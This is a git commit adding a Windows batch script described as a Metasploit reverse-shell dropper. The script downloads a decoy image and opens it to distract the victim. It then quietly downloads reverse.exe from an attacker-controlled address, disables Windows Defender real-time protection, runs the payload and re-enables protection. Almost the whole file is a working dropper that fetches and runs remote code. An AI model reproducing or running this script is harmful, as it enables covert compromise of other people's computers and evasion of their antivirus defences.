86fb3dc5e3efc3aad9704e4941a88cd8cdba04bc
5pyD3R <96535745+3rr0r-505@users.noreply.github.com>
2024-03-20 13:28:22 +0530

    Add files via upload

---
+++ jongosh.bat
@@ -0,0 +1,21 @@
+REM reverse shell using metasploit
+@echo off
+cd %TEMP%
+
+set "IMAGE_URL=https://raw.githubusercontent.com/3rr0r-505/jongoDB/main/jongo.png" REM Replace with the image hosting site
+set "EXE_URL=http://192.168.77.129/reverse.exe" REM Replace with the file hosting site
+set "EXE_FILE=C:\Users\samra\AppData\Local\Temp\reverse.exe"  REM Replace with the desired absolute path
+
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%IMAGE_URL%', 'image.jpg')"
+
+start /B "" image.jpg
+
+ping 127.0.0.1 -n 6 > nul
+
+powershell -WindowStyle Hidden -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('%EXE_URL%', '%EXE_FILE%');"
+
+powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+start /B /WAIT "" "%EXE_FILE%"
+
+powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
